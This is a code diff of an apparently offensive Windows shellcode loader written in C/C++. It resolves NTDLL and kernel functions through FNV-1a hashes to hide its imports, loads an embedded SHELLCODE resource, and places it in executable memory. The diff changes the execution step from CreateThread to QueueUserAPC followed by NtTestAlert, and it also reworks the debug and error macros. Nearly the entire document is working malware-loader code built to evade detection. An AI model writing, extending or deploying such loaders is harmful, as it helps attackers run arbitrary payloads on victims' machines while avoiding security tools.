@@ -5,25 +5,27 @@
 #include <stdio.h>
 #include <cstdint>
 
-#define SHELLCODE       101
-#define FVN_OFFSET		(const unsigned int) 2166136261
-#define FVN_PRIME		(const unsigned int) 16777619
-#define LOCAL_HEAP		((PPEB)__readgsqword(0x60))->ProcessHeap
+#define SHELLCODE           101
+#define FNV_OFFSET		    (const unsigned int) 2166136261
+#define FNV_PRIME		    (const unsigned int) 16777619
+#define LOCAL_HEAP		    ((PPEB)__readgsqword(0x60))->ProcessHeap
 
-#define DEBUG
 #ifdef DEBUG
-#define INFO 			printf("[INFO] ")
-#define ERR 			printf("[ERR] ")
-#define DBG_PRINT(m,x) 	m; printf x
+#define INFO 			    printf("[INF] ");
+#define ERR 			    printf("[ERR] ");
+#define DBG_PRINT(m,x) 	    m; printf x;
+#define ERROR_              DBG_PRINT(ERR, ("exit status 0x%lx, line %d\n", ntstatus, line))
+#define print_bytes(b,n)    for (int i = 0; i < n; i++) { printf("%x ", ((PBYTE)b)[i]); }
 #else
 #define INFO 
 #define ERR
-#define DBG_PRINT(m,x) 	do {} while (0)
+#define DBG_PRINT(m,x) 	    do {} while (0)
+#define ERROR_
 #endif
-#define XCPT_IMPL       NTSTATUS ntstatus = { 0 }; INT line = 0
-#define return_defer    ntstatus = GetLastError(); line = __LINE__; goto defer
-#define assert(x)       ntstatus = x; if (!NT_SUCCESS( ntstatus )) { line = __LINE__; goto defer; }
-#define assign(p,x)     p = x; if (!p) { return_defer; }
+#define XCPT_IMPL           NTSTATUS ntstatus = { 0 }; INT line = 0
+#define return_defer        ntstatus = GetLastError(); line = __LINE__; ERROR_; goto defer
+#define assert(x)           ntstatus = x; if (!NT_SUCCESS( ntstatus )) { line = __LINE__; ERROR_; goto defer; }
+#define assign(p,x)         p = x; if (!p) { return_defer; }
 
 HMODULE GetModuleAddress(DWORD hash);
 FARPROC GetSymbolAddress(HMODULE base, DWORD hash);
@@ -33,27 +35,29 @@ PAPI ResolveApi() {
 	auto RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
 	auto instance 			= (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
 
-	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
-	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
-	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATETHREAD);
-	instance->win32.NtWaitForSingleObject = (NtWaitForSingleObject_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
-	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
-	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
-	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
-    instance->win32.FreeResource = (FreeResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FREERESOURCE);
-	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
-	instance->win32.RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
+	instance->win32.RtlAllocateHeap 		= (RtlAllocateHeap_t) GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
+	instance->win32.RtlFreeHeap 			= (RtlFreeHeap_t) GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
+	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
+	instance->win32.NtProtectVirtualMemory 	= (NtProtectVirtualMemory_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
+	instance->win32.FindResourceA 			= (FindResourceA_t) GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
+	instance->win32.SizeofResource 			= (SizeofResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
+	instance->win32.LoadResource 			= (LoadResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
+    instance->win32.FreeResource 			= (FreeResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), FREERESOURCE);
+	instance->win32.CreateThread 			= (CreateThread_t) GetSymbolAddress(GetModuleAddress(KERNEL10), CREATETHREAD);
+	instance->win32.NtWaitForSingleObject 	= (NtWaitForSingleObject_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
+	instance->win32.QueueUserAPC 			= (QueueUserAPC_t) GetSymbolAddress(GetModuleAddress(KERNEL10), QUEUEUSERAPC);
+	instance->win32.NtTestAlert 			= (NtTestAlert_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTTESTALERT);
 
 	return instance;
 }
 
 template<typename MTYPE> DWORD HashString(MTYPE string, SIZE_T length) {
 	
-	auto hash = FVN_OFFSET;
+	auto hash = FNV_OFFSET;
 
 	for (auto i = 0; i < length; i++) {
 		hash ^= string[i];
-		hash *= FVN_PRIME;
+		hash *= FNV_PRIME;
 	}
 	return hash;
 }
@@ -104,7 +108,7 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 	}
 }
 
-int main() {
+NTSTATUS BootstrapAPC() {
 
 	PAPI instance 		= { 0 };
 	HANDLE hThread 		= { 0 };
@@ -122,7 +126,6 @@ int main() {
 	assign(resource->Length	    , instance->win32.SizeofResource(NULL, resource->Object));
 	assign(resource->hGlobal 	, instance->win32.LoadResource(NULL, resource->Object));
 
-    DBG_PRINT(INFO, ("allocating space for resources\n"));
 	assert(instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
 	if (NT_SUCCESS(ntstatus)) {
 
@@ -135,16 +138,14 @@ int main() {
 		assert(instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect))
 		if (NT_SUCCESS(ntstatus)) {
 
-            DBG_PRINT(INFO, ("executing thread\n"));
-			assign(hThread, instance->win32.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL))
-			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
-		} 	
+			instance->win32.QueueUserAPC((PAPCFUNC)((LPTHREAD_START_ROUTINE)lpBuffer), NtCurrentThread(), NULL);
+			instance->win32.NtTestAlert();
+		}
 	}
 defer:
 	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, resource);
 	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, instance);
 
-    DBG_PRINT(INFO, ("exit status 0x%lx, line %d\n", ntstatus, line));
 	return 0;
 }
 
